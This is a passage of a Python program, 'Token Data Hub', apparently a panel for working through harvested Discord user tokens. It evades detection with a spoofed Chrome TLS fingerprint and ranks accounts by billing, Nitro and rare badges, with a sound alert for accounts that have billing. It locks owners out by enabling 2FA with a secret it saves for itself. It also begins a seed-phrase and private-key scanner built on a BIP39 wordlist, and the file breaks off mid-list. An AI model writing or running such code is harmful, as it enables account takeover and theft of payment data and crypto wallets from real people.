"""
Token Data Hub v6 — Discord-Style Profile Cards, Badge Images, Sound Alerts, Seed Scanner
"""
import threading, time, json, re, os, sys, queue, struct, wave, math
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

for pkg in ['customtkinter', 'requests', 'Pillow', 'websocket-client', 'selenium', 'curl-cffi', 'nltk', 'pyotp']:
    try:
        __import__(pkg.lower().replace('-', '_').split('[')[0])
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '-q'])

import customtkinter as ctk
import requests
from curl_cffi import requests as creq
from PIL import Image, ImageDraw, ImageTk, ImageFont, ImageFilter
from io import BytesIO
import tkinter as tk
import base64
import winsound
import pyotp

# ── English dictionary for OG username detection ──
_ENGLISH_WORDS = set()
try:
    import nltk
    nltk.download('words', quiet=True)
    from nltk.corpus import words as _nltk_words
    _ENGLISH_WORDS = set(w.lower() for w in _nltk_words.words() if len(w) >= 3)
    print(f'[dict] Loaded {len(_ENGLISH_WORDS):,} English words')
except Exception:
    print('[dict] nltk words unavailable — OG word detection disabled')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Config
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
USER_TOKEN = os.environ.get('USER_TOKEN', '')
GUILD_ID = '1465555562841247758'
CHANNEL_ID = '1477765122184187956'
API = 'https://discord.com/api/v9'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
CHROME_VER = '136'
SEC_CH_UA = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="24"'
SEC_CH_UA_MOBILE = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'
BUILD = 368827
TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tokens.txt')
TOKENS_DATA_OLD = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'token_data_old.txt')
VERIFY_WORKERS = 8

def _sprops():
    return base64.b64encode(json.dumps({
        'os': 'Windows', 'browser': 'Chrome', 'device': '',
        'system_locale': 'en-US', 'browser_user_agent': UA,
        'browser_version': f'{CHROME_VER}.0.0.0', 'os_version': '10',
        'referrer': '', 'referring_domain': '',
        'referrer_current': '', 'referring_domain_current': '',
        'release_channel': 'stable',
        'client_build_number': BUILD, 'client_event_source': None
    }).encode()).decode()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Theme — refined dark palette
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
C = {
    'bg':           '#0a0a12',
    'bg_alt':       '#0e0e18',
    'surface':      '#13131d',
    'surface_2':    '#1a1a28',
    'card':         '#161622',
    'card_hover':   '#1e1e30',
    'accent':       '#7c3aed',
    'accent_2':     '#8b5cf6',
    'accent_hover': '#6d28d9',
    'green':        '#22c55e',
    'green_dim':    '#16a34a',
    'green_bg':     '#0a2e1a',
    'red':          '#ef4444',
    'red_dim':      '#dc2626',
    'yellow':       '#eab308',
    'orange':       '#f97316',
    'pink':         '#ec4899',
    'nitro':        '#f47fff',
    'cyan':         '#06b6d4',
    'text':         '#eef2ff',
    'text_2':       '#c7d2fe',
    'text_dim':     '#94a3b8',
    'text_muted':   '#64748b',
    'border':       '#1e293b',
    'border_light': '#334155',
    'console_bg':   '#06060c',
}

FONT = 'Segoe UI'
MONO = 'Cascadia Code'

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


def _headers(token):
    return {
        'Authorization': token,
        'User-Agent': UA,
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'X-Discord-Locale': 'en-US',
        'X-Discord-Timezone': 'America/New_York',
        'X-Debug-Options': 'bugReporterEnabled',
        'X-Super-Properties': _sprops(),
        'Sec-CH-UA': SEC_CH_UA,
        'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
        'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

def _headers_no_ct(token):
    h = _headers(token)
    h.pop('Content-Type', None)
    return h

# Stealth session cache per token
_stealth_sessions = {}
_session_lock = threading.Lock()

def _get_stealth_session(token):
    """Get or create a curl_cffi stealth session for a token (Chrome TLS fingerprint + cookies)."""
    with _session_lock:
        if token in _stealth_sessions:
            return _stealth_sessions[token]
    s = creq.Session(impersonate='chrome')
    # Visit Discord to get Cloudflare cookies
    try:
        s.get('https://discord.com/channels/@me', headers={
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': UA,
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
        }, timeout=15)
    except:
        pass
    with _session_lock:
        _stealth_sessions[token] = s
    return s

def _stealth_get(token, url, timeout=10):
    """GET with Chrome TLS fingerprint + full Discord headers."""
    s = _get_stealth_session(token)
    return s.get(url, headers=_headers_no_ct(token), timeout=timeout)

def _stealth_post(token, url, json_data=None, timeout=10):
    """POST with Chrome TLS fingerprint + full Discord headers."""
    s = _get_stealth_session(token)
    return s.post(url, headers=_headers(token), json=json_data, timeout=timeout)

def _stealth_patch(token, url, json_data=None, timeout=10):
    """PATCH with Chrome TLS fingerprint + full Discord headers."""
    s = _get_stealth_session(token)
    return s.patch(url, headers=_headers(token), json=json_data, timeout=timeout)

def _stealth_put(token, url, json_data=None, timeout=10):
    """PUT with Chrome TLS fingerprint + full Discord headers."""
    s = _get_stealth_session(token)
    return s.put(url, headers=_headers(token), json=json_data, timeout=timeout)

def _stealth_delete(token, url, timeout=10):
    """DELETE with Chrome TLS fingerprint + full Discord headers."""
    s = _get_stealth_session(token)
    return s.delete(url, headers=_headers(token), timeout=timeout)

def api_headers():
    return _headers(USER_TOKEN)

def get_headers_no_ct():
    return _headers_no_ct(USER_TOKEN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  2FA (TOTP) Auto-Enable
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')

def enable_totp_2fa(token, password):
    """
    Enable TOTP 2FA on a Discord account.
    Returns dict with: new_token, backup_codes, secret
    Raises ValueError on failure.
    """
    url = f'{API}/users/@me/mfa/totp/enable'

    # Phase 1: Validate password
    r1 = _stealth_post(token, url, json_data={'password': password})
    if r1.status_code == 200:
        # Unexpected success (already enabled?)
        return r1.json()
    j1 = r1.json()
    if j1.get('code') not in (60005, None):
        msg = j1.get('message', 'Unknown error')
        if j1.get('code') == 50035:
            errs = j1.get('errors', {})
            if 'password' in errs:
                msg = 'Wrong password'
        raise ValueError(f'{msg} (code {j1.get("code")})')

    # Phase 2: Generate secret + code, send all three
    secret = pyotp.random_base32(length=32)
    totp = pyotp.TOTP(secret)
    code = totp.now()

    r2 = _stealth_post(token, url, json_data={
        'password': password,
        'secret': secret,
        'code': code,
    })
    if r2.status_code != 200:
        j2 = r2.json()
        raise ValueError(f'{j2.get("message", "Unknown")} (code {j2.get("code", "?")})')

    result = r2.json()
    new_token = result.get('token', token)
    backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]

    # Save secret + backup codes to file
    try:
        with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
            # username lookup
            try:
                me = _stealth_get(new_token, f'{API}/users/@me', timeout=8)
                uname = me.json().get('username', '?') if me.status_code == 200 else '?'
            except:
                uname = '?'
            f.write(json.dumps({
                'username': uname,
                'token': new_token,
                'secret': secret,
                'backup_codes': backup_codes,
                'enabled_at': datetime.now(timezone.utc).isoformat(),
            }) + '\n')
        print(f'[2fa] Secret saved to {TOTP_SECRETS_FILE}')
    except Exception as e:
        print(f'[2fa] Warning: could not save secret file: {e}')

    return {
        'new_token': new_token,
        'secret': secret,
        'backup_codes': backup_codes,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Avatar helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_avatar_cache = {}
_default_avatar = None


def _make_circular(img, size=48):
    img = img.resize((size, size), Image.LANCZOS)
    mask = Image.new('L', (size, size), 0)
    ImageDraw.Draw(mask).ellipse((0, 0, size, size), fill=255)
    result = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    result.paste(img, (0, 0), mask)
    return result


def get_avatar_image(url, size=48):
    if not url:
        return _get_default_avatar(size)
    if url in _avatar_cache:
        return _avatar_cache[url]
    try:
        r = requests.get(url, timeout=8)
        if r.status_code == 200:
            img = Image.open(BytesIO(r.content)).convert('RGBA')
            circular = _make_circular(img, size)
            ctk_img = ctk.CTkImage(light_image=circular, dark_image=circular, size=(size, size))
            _avatar_cache[url] = ctk_img
            return ctk_img
    except:
        pass
    return _get_default_avatar(size)


def _get_default_avatar(size=48):
    global _default_avatar
    if _default_avatar:
        return _default_avatar
    img = Image.new('RGBA', (size, size), (88, 101, 242, 255))
    draw = ImageDraw.Draw(img)
    cx, cy = size // 2, size // 2
    r = size // 5
    draw.ellipse((cx - r, cy - r - 4, cx + r, cy + r - 4), fill=(255, 255, 255, 200))
    draw.ellipse((cx - r - 4, cy + 4, cx + r + 4, cy + r + 10), fill=(255, 255, 255, 200))
    circular = _make_circular(img, size)
    _default_avatar = ctk.CTkImage(light_image=circular, dark_image=circular, size=(size, size))
    return _default_avatar


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Badge image cache — real Discord badge PNGs
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_badge_image_cache = {}
_badge_prefetch_done = threading.Event()


def _country_flag(code):
    """Convert locale (en-US) or 2-letter country code (US) to flag emoji."""
    if not code:
        return ''
    # Extract country part: 'en-US' -> 'US', 'US' -> 'US', 'en' -> 'EN'
    parts = code.replace('_', '-').split('-')
    cc = parts[-1].upper() if len(parts) > 1 else parts[0].upper()
    if len(cc) != 2:
        return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc)
    except:
        return ''


BADGE_URLS = {
    'Staff':          'https://cdn.discordapp.com/badge-icons/5e74e9b61934fc1f67c65515d1f7e60d.png',
    'Partner':        'https://cdn.discordapp.com/badge-icons/3f9748e53446575cb5e2fedb76e23ad3.png',
    'HypeSquad':      'https://cdn.discordapp.com/badge-icons/bf01d1073931f921909045f3a39fd264.png',
    'BugHunter1':     'https://cdn.discordapp.com/badge-icons/2717692c7dca7289b35297f9e3de842e.png',
    'Bravery':        'https://cdn.discordapp.com/badge-icons/8a88d63823d8a71cd5e390baa45efa02.png',
    'Brilliance':     'https://cdn.discordapp.com/badge-icons/011940fd013da3f7fb926e4a1cd2e618.png',
    'Balance':        'https://cdn.discordapp.com/badge-icons/3aa41de486fa12454c3761e8e223571e.png',
    'EarlySupporter': 'https://cdn.discordapp.com/badge-icons/7060786766c9c840eb3019e725d2b358.png',
    'BugHunter2':     'https://cdn.discordapp.com/badge-icons/848f79cfac4d01b5d1ce51be6e27cfde.png',
    'VerifiedDev':    'https://cdn.discordapp.com/badge-icons/6df5892e0f35b051f8b61eace34f4967.png',
    'ActiveDev':      'https://cdn.discordapp.com/badge-icons/6bdc42827a38498929a4920da12695d9.png',
    'CertMod':        'https://cdn.discordapp.com/badge-icons/fee1624003e2fee35cb398e125dc479b.png',
    'Nitro':          'https://cdn.discordapp.com/badge-icons/2ba85e8026a8614b640c2837bcdfe21b.png',
    'NitroClassic':   'https://cdn.discordapp.com/badge-icons/2ba85e8026a8614b640c2837bcdfe21b.png',
    'NitroBasic':     'https://cdn.discordapp.com/badge-icons/2ba85e8026a8614b640c2837bcdfe21b.png',
    'Boost1':         'https://cdn.discordapp.com/badge-icons/51040c70d4f20a921ad6674ff86fc95c.png',
}

_BADGE_COLORS = {
    'Staff': (88, 101, 242), 'Partner': (88, 101, 242), 'HypeSquad': (244, 169, 56),
    'BugHunter1': (62, 185, 95), 'Bravery': (155, 89, 182), 'Brilliance': (233, 76, 60),
    'Balance': (38, 166, 154), 'EarlySupporter': (115, 142, 245), 'BugHunter2': (198, 156, 47),
    'VerifiedDev': (88, 101, 242), 'ActiveDev': (35, 165, 90), 'CertMod': (88, 101, 242),
    'Nitro': (244, 127, 255), 'NitroClassic': (244, 127, 255), 'NitroBasic': (244, 127, 255),
    'Boost1': (244, 127, 255),
}


def _badge_fallback(name, size=18):
    """Instant colored-circle fallback badge (no network)."""
    color = _BADGE_COLORS.get(name, (100, 100, 100))
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.ellipse((0, 0, size - 1, size - 1), fill=(*color, 255))
    ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(size, size))
    return ctk_img


def _get_badge_image(name, size=18):
    """Get badge image from cache (instant). Returns fallback if not yet fetched."""
    key = f"{name}_{size}"
    cached = _badge_image_cache.get(key)
    if cached:
        return cached
    # Return instant fallback, real image will be in cache on next UI refresh
    fb = _badge_fallback(name, size)
    return fb


def _prefetch_all_badges():
    """Background: download all badge PNGs from CDN and fill the cache."""
    for name, url in BADGE_URLS.items():
        for size in (18,):
            key = f"{name}_{size}"
            if key in _badge_image_cache:
                continue
            try:
                r = requests.get(url, timeout=8)
                if r.status_code == 200:
                    img = Image.open(BytesIO(r.content)).convert('RGBA').resize((size, size), Image.LANCZOS)
                    ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(size, size))
                    _badge_image_cache[key] = ctk_img
            except:
                pass
    _badge_prefetch_done.set()
    print(f'[badges] Pre-cached {len(_badge_image_cache)} badge images')


# Launch badge pre-fetch immediately on import
threading.Thread(target=_prefetch_all_badges, daemon=True).start()


CONN_ICONS = {
    'steam': '\U0001f3ae', 'spotify': '\U0001f3b5', 'twitch': '\U0001f4fa', 'youtube': '\u25b6\ufe0f',
    'twitter': '\U0001f426', 'reddit': '\U0001f534', 'facebook': '\U0001f4d8', 'github': '\U0001f419',
    'xbox': '\U0001f3ae', 'playstation': '\U0001f3ae', 'epicgames': '\U0001f3ae', 'battlenet': '\u2694\ufe0f',
    'instagram': '\U0001f4f7', 'tiktok': '\U0001f3b5', 'domain': '\U0001f310', 'crunchyroll': '\U0001f365',
}

# Friendly badge display names (shown on hover, like Discord)
BADGE_DISPLAY_NAMES = {
    'Staff': 'Discord Staff',
    'Partner': 'Partnered Server Owner',
    'HypeSquad': 'HypeSquad Events',
    'BugHunter1': 'Discord Bug Hunter',
    'Bravery': 'HypeSquad Bravery',
    'Brilliance': 'HypeSquad Brilliance',
    'Balance': 'HypeSquad Balance',
    'EarlySupporter': 'Early Supporter',
    'BugHunter2': 'Discord Bug Hunter (Gold)',
    'VerifiedDev': 'Early Verified Bot Developer',
    'ActiveDev': 'Active Developer',
    'CertMod': 'Discord Certified Moderator',
    'Nitro': 'Subscriber since',
    'NitroClassic': 'Subscriber since',
    'NitroBasic': 'Subscriber since',
    'Boost1': 'Server Boosting',
}

# Importance tier banner colors
TIER_COLORS = {
    'legendary': '#fbbf24',   # Gold  — billing + OG badges / rare nitro
    'epic':      '#a855f7',   # Purple — nitro or good badges
    'rare':      '#3b82f6',   # Blue  — verified email, some connections
    'common':    '#374151',   # Dark gray — basic token
}

def _get_tier(t):
    """Return (tier_name, tier_color) for a token based on importance."""
    score = t.importance_score
    if score >= 50 or (t.has_billing and t.nitro):
        return 'legendary', TIER_COLORS['legendary']
    elif score >= 20 or t.nitro or t.has_billing:
        return 'epic', TIER_COLORS['epic']
    elif score >= 5 or (t.email and t.email != 'N/A' and t.verified):
        return 'rare', TIER_COLORS['rare']
    return 'common', TIER_COLORS['common']


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Sound effects — billing ding
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DING_WAV = os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ding.wav')


def _generate_ding_wav():
    if os.path.exists(DING_WAV):
        return
    sr = 44100
    dur = 0.4
    freq = 1046.5
    n = int(sr * dur)
    data = b''
    for i in range(n):
        t = i / sr
        envelope = math.exp(-t * 8) * 0.7
        sample = envelope * math.sin(2 * math.pi * freq * t)
        sample += envelope * 0.3 * math.sin(2 * math.pi * freq * 2 * t)
        sample = max(-1, min(1, sample))
        data += struct.pack('<h', int(sample * 32000))
    with wave.open(DING_WAV, 'w') as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(sr)
        w.writeframes(data)


try:
    _generate_ding_wav()
except:
    pass


def _play_ding():
    try:
        winsound.PlaySound(DING_WAV, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_NODEFAULT)
    except:
        try:
            winsound.MessageBeep(winsound.MB_ICONASTERISK)
        except:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Seed Phrase / Private Key Scanner
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IMPORTANT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'important.txt')

_BIP39_COMMON = {
    'abandon','ability','able','about','above','absent','absorb','abstract','absurd','abuse',
    'access','accident','account','accuse','achieve','acid','acoustic','acquire','across','act',
    'action','actor','actress','actual','adapt','add','addict','address','adjust','admit',
    'adult','advance','advice','aerobic','affair','afford','afraid','again','age','agent',
    'agree','ahead','aim','air','airport','aisle','alarm','album','alcohol','alert',
    'alien','all','alley','allow','almost','alone','alpha','already','also','alter',
    'always','amateur','amazing','among','amount','amused','analyst','anchor','ancient','anger',
    'angle','angry','animal','ankle','announce','annual','another','answer','antenna','antique',
    'anxiety','any','apart','apology','appear','apple','approve','april','arch','arctic',
    'area','arena','argue','arm','armed','armor','army','around','arrange','arrest',
    'arrive','arrow','art','artefact','artist','artwork','ask','aspect','assault','asset',
    'assist','assume','asthma','athlete','atom','attack','attend','attitude','attract','auction',
    'audit','august','aunt','author','auto','autumn','average','avocado','avoid','awake',
    'aware','awesome','awful','awkward','axis','baby','bachelor','bacon','badge','bag',
    'balance','balcony','ball','bamboo','banana','banner','bar','barely','bargain','barrel',
    'base','basic','basket','battle','beach','bean','beauty','because','become','beef',
    'before','begin','behave','behind','believe','below','belt','bench','benefit','best',
    'betray','better','between','beyond','bicycle','bid','bike','bind','biology','bird',
    'birth','bitter','black','blade','blame','blanket','blast','bleak','bless','blind',
    'blood','blossom','blow','blue','blur','blush','board','boat','body','boil',
    'bomb','bone','bonus','book','boost','border','boring','borrow','boss','bottom',
    'bounce','box','boy','bracket','brain','brand','brass','brave','bread','breeze',
    'brick','bridge','brief','bright','bring','brisk','broccoli','broken','bronze','broom',
    'brother','brown','brush','bubble','buddy','budget','buffalo','build','bulb','bulk',
    'bullet','bundle','bunny','burden','burger','burst','bus','business','busy','butter',
    'buyer','buzz','cabbage','cabin','cable','cactus','cage','cake','call','calm',
    'camera','camp','can','canal','cancel','candy','cannon','canoe','canvas','canyon',
    'capable','capital','captain','car','carbon','card','cargo','carpet','carry','cart',
    'case','cash','casino','castle','casual','cat','catalog','catch','category','cattle',
    'caught','cause','caution','cave','ceiling','celery','cement','census','century','cereal',
    'certain','chair','chalk','champion','change','chaos','chapter','charge','chase','cheap',
    'check','cheese','chef','cherry','chest','chicken','chief','child','chimney','choice',
    'choose','chronic','chuckle','chunk','churn','citizen','city','civil','claim','clap',
    'clarify','claw','clay','clean','clerk','clever','cliff','climb','clinic','clip',
    'clock','clog','close','cloth','cloud','clown','club','clump','cluster','clutch',
    'coach','coast','coconut','code','coffee','coil','coin','collect','color','column',
    'combine','come','comfort','comic','common','company','concert','conduct','confirm','congress',
    'connect','consider','control','convince','cook','cool','copper','copy','coral','core',
    'corn','correct','cost','cotton','couch','country','couple','course','cousin','cover',
    'coyote','crack','cradle','craft','cram','crane','crash','crater','crawl','crazy',
    'cream','credit','creek','crew','cricket','crime','crisp','critic','crop','cross',
    'crouch','crowd','crucial','cruel','cruise','crumble','crush','cry','crystal','cube',
    'culture','cup','cupboard','curious','current','curtain','curve','cushion','custom','cute',
    'cycle','dad','damage','damp','dance','danger','daring','dash','daughter','dawn',
    'day','deal','debate','debris','decade','december','decide','decline','decorate','decrease',
    'deer','defense','define','defy','degree','delay','deliver','demand','demise','denial',
    'dentist','deny','depart','depend','deposit','depth','deputy','derive','describe','desert',
    'design','desk','despair','destroy','detail','detect','develop','device','devote','diagram',
    'dial','diamond','diary','dice','diesel','diet','differ','digital','dignity','dilemma',
    'dinner','dinosaur','direct','dirt','disagree','discover','disease','dish','dismiss','disorder',
    'display','distance','divert','divide','divorce','dizzy','doctor','document','dog','doll',
    'dolphin','domain','donate','donkey','donor','door','dose','double','dove','draft',
    'dragon','drama','drastic','draw','dream','dress','drift','drill','drink','drip',
    'drive','drop','drum','dry','duck','dumb','dune','during','dust','dutch',
    'duty','dwarf','dynamic','eager','eagle','early','earn','earth','easily','east',
    'easy','echo','ecology','economy','edge','edit','educate','effort','egg','eight',
    'either','elbow','elder','electric','elegant','element','elephant','elevator','elite','else',
    'embark','embody','embrace','emerge','emotion','employ','empower','empty','enable','enact',
    'end','endless','endorse','enemy','energy','enforce','engage','engine','enhance','enjoy',
    'enlist','enough','enrich','enroll','ensure','enter','entire','entry','envelope','episode',
    'equal','equip','era','erase','erode','erosion','error','erupt','escape','essay',
    'essence','estate','eternal','ethics','evidence','evil','evoke','evolve','exact','example',
    'excess','exchange','excite','exclude','excuse','execute','exercise','exhaust','exhibit','exile',
    'exist','exit','exotic','expand','expect','expire','explain','expose','express','extend',
    'extra','eye','eyebrow','fabric','face','faculty','fade','faint','faith','fall',
    'false','fame','family','famous','fan','fancy','fantasy','farm','fashion','fat',
    'fatal','father','fatigue','fault','favorite','feature','february','federal','fee','feed',
    'feel','female','fence','festival','fetch','fever','few','fiber','fiction','field',
    'figure','file','film','filter','final','find','fine','finger','finish','fire',
    'firm','fiscal','fish','fit','fitness','fix','flag','flame','flash','flat',
    'flavor','flee','flight','flip','float','flock','floor','flower','fluid','flush',
    'fly','foam','focus','fog','foil','fold','follow','food','foot','force',
    'forest','forget','fork','fortune','forum','forward','fossil','foster','found','fox',
    'fragile','frame','frequent','fresh','friend','fringe','frog','front','frost','frown',
    'frozen','fruit','fuel','fun','funny','furnace','fury','future','gadget','gain',
    'galaxy','gallery','game','gap','garage','garbage','garden','garlic','garment','gas',
    'gasp','gate','gather','gauge','gaze','general','genius','genre','gentle','genuine',
    'gesture','ghost','giant','gift','giggle','ginger','giraffe','girl','give','glad',
    'glance','glare','glass','glide','glimpse','globe','gloom','glory','glove','glow',
    'glue','goat','goddess','gold','good','goose','gorilla','gospel','gossip','govern',
    'gown','grab','grace','grain','grant','grape','grass','gravity','great','green',
    'grid','grief','grit','grocery','group','grow','grunt','guard','guess','guide',
    'guilt','guitar','gun','gym','habit','hair','half','hammer','hamster','hand',
    'happy','harbor','hard','harsh','harvest','hat','have','hawk','hazard','head',
    'health','heart','heavy','hedgehog','height','hello','helmet','help','hen','hero',
    'hip','hire','history','hobby','hockey','hold','hole','holiday','hollow','home',
    'honey','hood','hope','horn','horror','horse','hospital','host','hotel','hour',
    'hover','hub','huge','human','humble','humor','hundred','hungry','hunt','hurdle',
    'hurry','hurt','husband','hybrid','ice','icon','idea','identify','idle','ignore',
    'ill','illegal','illness','image','imitate','immense','immune','impact','impose','improve',
    'impulse','inch','include','income','increase','index','indicate','indoor','industry','infant',
    'inflict','inform','initial','inject','inmate','inner','innocent','input','inquiry','insane',
    'insect','inside','inspire','install','intact','interest','into','invest','invite','involve',
    'iron','island','isolate','issue','item','ivory','jacket','jaguar','jar','jazz',
    'jealous','jeans','jelly','jewel','job','join','joke','journey','joy','judge',
    'juice','jump','jungle','junior','junk','just','kangaroo','keen','keep','ketchup',
    'key','kick','kid','kidney','kind','kingdom','kiss','kit','kitchen','kite',
    'kitten','kiwi','knee','knife','knock','know','lab','label','labor','ladder',
    'lady','lake','lamp','language','laptop','large','later','latin','laugh','laundry',
    'lava','law','lawn','lawsuit','layer','lazy','leader','leaf','learn','leave',
    'lecture','left','leg','legal','legend','leisure','lemon','lend','length','lens',
    'leopard','lesson','letter','level','liberty','library','license','life','lift','light',
    'like','limb','limit','link','lion','liquid','list','little','live','lizard',
    'load','loan','lobster','local','lock','logic','lonely','long','loop','lottery',
    'loud','lounge','love','loyal','lucky','luggage','lumber','lunar','lunch','luxury',
    'lyrics','machine','mad','magic','magnet','maid','mail','main','major','make',
    'mammal','man','manage','mandate','mango','mansion','manual','maple','marble','march',
    'margin','marine','market','marriage','mask','mass','master','match','material','math',
    'matrix','matter','maximum','maze','meadow','mean','measure','meat','mechanic','medal',
    'media','melody','melt','member','memory','mention','menu','mercy','merge','merit',
    'merry','mesh','message','metal','method','middle','midnight','milk','million','mimic',
    'mind','minimum','minor','minute','miracle','mirror','misery','miss','mistake','mix',
    'mixed','mixture','mobile','model','modify','mom','moment','monitor','monkey','monster',
    'month','moon','moral','more','morning','mosquito','mother','motion','motor','mountain',
    'mouse','move','movie','much','muffin','mule','multiply','muscle','museum','mushroom',
    'music','must','mutual','myself','mystery','myth','naive','name','napkin','narrow',
    'nasty','nation','nature','near','neck','need','negative','neglect','neither','nephew',
    'nerve','nest','net','network','neutral','never','news','next','nice','night',
    'noble','noise','nominee','noodle','normal','north','nose','notable','nothing','notice',
    'novel','now','nuclear','number','nurse','nut','oak','obey','object','oblige',
    'obscure','observe','obtain','obvious','occur','ocean','october','odor','off','offer',
    'office','often','oil','okay','old','olive','olympic','omit','once','one',
    'onion','online','only','open','opera','opinion','oppose','option','orange','orbit',
    'orchard','order','ordinary','organ','orient','original','orphan','ostrich','other','outdoor',
    'outer','output','outside','oval','oven','over','own','owner','oxygen','oyster',
    'ozone','pact','paddle','page','pair','palace','palm','panda','panel','panic',
    'panther','paper','parade','parent','park','parrot','party','pass','patch','path',
    'patient','patrol','pattern','pause','pave','payment','peace','peanut','pear','peasant',
    'pelican','pen','penalty','pencil','people','pepper','perfect','permit','person','pet',
    'phone','photo','phrase','physical','piano','picnic','picture','piece','pig','pigeon',
    'pill','pilot','pink','pioneer','pipe','pistol','pitch','pizza','place','planet',
    'plastic','plate','play','please','pledge','pluck','plug','plunge','poem','poet',
    'point','polar','pole','police','pond','pony','pool','popular','portion','position',
    'possible','post','potato','pottery','poverty','powder','power','practice','praise','predict',
    'prefer','prepare','present','pretty','prevent','price','pride','primary','print','priority',
    'prison','private','prize','problem','process','produce','profit','program','project','promote',
    'proof','property','prosper','protect','proud','provide','public','pudding','pull','pulp',
    'pulse','pumpkin','punch','pupil','puppy','purchase','purity','purpose','purse','push',
    'put','puzzle','pyramid','quality','quantum','quarter','question','quick','quit','quiz',
    'quote','rabbit','raccoon','race','rack','radar','radio','rage','rail','rain',
    'raise','rally','ramp','ranch','random','range','rapid','rare','rate','rather',
    'raven','raw','razor','ready','real','reason','rebel','rebuild','recall','receive',
    'recipe','record','recycle','reduce','reflect','reform','region','regret','regular','reject',
    'relax','release','relief','rely','remain','remember','remind','remove','render','renew',
    'rent','reopen','repair','repeat','replace','report','require','rescue','resemble','resist',
    'resource','response','result','retire','retreat','return','reunion','reveal','review','reward',
    'rhythm','rib','ribbon','rice','rich','ride','ridge','rifle','right','rigid',
    'ring','riot','ripple','risk','ritual','rival','river','road','roast','robot',
    'robust','rocket','romance','roof','rookie','room','rose','rotate','rough','round',
    'route','royal','rubber','rude','rug','rule','run','runway','rural','sad',
    'saddle','sadness','safe','sail','salad','salmon','salon','salt','salute','same',
    'sample','sand','satisfy','satoshi','sauce','sausage','save','say','scale','scan',
    'scare','scatter','scene','scheme','school','science','scissors','scorpion','scout','scrap',
    'screen','script','scrub','sea','search','season','seat','second','secret','section',
    'security','seed','seek','segment','select','sell','seminar','senior','sense','sentence',
    'series','service','session','settle','setup','seven','shadow','shaft','shallow','share',
    'shed','shell','sheriff','shield','shift','shine','ship','shiver','shock','shoe',
    'shoot','shop','short','shoulder','shove','shrimp','shrug','shuffle','shy','sibling',
    'sick','side','siege','sight','sign','silent','silk','silly','silver','similar',
    'simple','since','sing','siren','sister','situate','six','size','skate','sketch',
    'ski','skill','skin','skirt','skull','slab','slam','sleep','slender','slice',
    'slide','slight','slim','slogan','slot','slow','slush','small','smart','smile',
    'smoke','smooth','snack','snake','snap','sniff','snow','soap','soccer','social',
    'sock','soda','soft','solar','soldier','solid','solution','solve','someone','song',
    'soon','sorry','sort','soul','sound','soup','source','south','space','spare',
    'spatial','spawn','speak','special','speed','spell','spend','sphere','spice','spider',
    'spike','spin','spirit','split','sponsor','spoon','sport','spot','spray','spread',
    'spring','spy','square','squeeze','squirrel','stable','stadium','staff','stage','stairs',
    'stamp','stand','start','state','stay','steak','steel','stem','step','stereo',
